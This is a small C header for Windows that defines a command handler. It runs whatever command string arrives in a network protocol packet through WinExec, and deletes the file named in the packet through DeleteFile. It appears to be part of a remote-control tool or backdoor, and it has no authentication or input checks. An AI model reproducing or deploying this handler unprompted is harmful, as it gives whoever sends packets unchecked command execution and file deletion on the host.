#ifndef SHELLEXECUTOR_H
#define SHELLEXECUTOR_H

#include <windows.h>
#include "iexecutor.h"
#include "../Protocol/Commands.h"
#include "../Protocol/Result.h"

void ExecuteCommand(PackCommand* packCommand, PackResult* resultCommand)
{
	switch(packCommand->commandType)
	{
	case COM_EXEC:
		WinExec((LPCSTR)packCommand->data, SW_SHOW);
		break;

	case COM_DEL:
		DeleteFile((LPCWSTR)packCommand->data);
		break;

	default:break;
	}
}


#endif // SHELLEXECUTOR_H